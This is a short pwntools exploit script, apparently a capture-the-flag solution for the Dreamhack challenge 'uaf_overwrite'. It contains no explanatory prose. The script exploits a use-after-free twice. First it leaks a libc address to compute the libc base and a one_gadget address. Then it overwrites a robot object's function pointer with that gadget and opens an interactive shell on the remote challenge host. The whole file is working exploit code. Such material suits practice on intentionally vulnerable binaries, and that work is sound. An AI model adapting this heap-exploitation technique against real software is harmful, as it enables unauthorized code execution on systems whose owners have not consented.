# Name: uaf_overwrite.py
from pwn import *
p = process("./uaf_overwrite")

p = remote("host3.dreamhack.games", 8778)

def slog(sym, val): success(sym + ": " + hex(val))
def human(weight, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(weight))
    p.sendlineafter(": ", str(age))
def robot(weight):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(weight))
def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))
# UAF to calculate the `libc_base`
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1)
lb = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc42
og = lb + 0x10a41c
slog("libc_base", lb)
slog("one_gadget", og)
# UAF to manipulate `robot->fptr` & get shell
human("1", og)
robot("1")
p.interactive()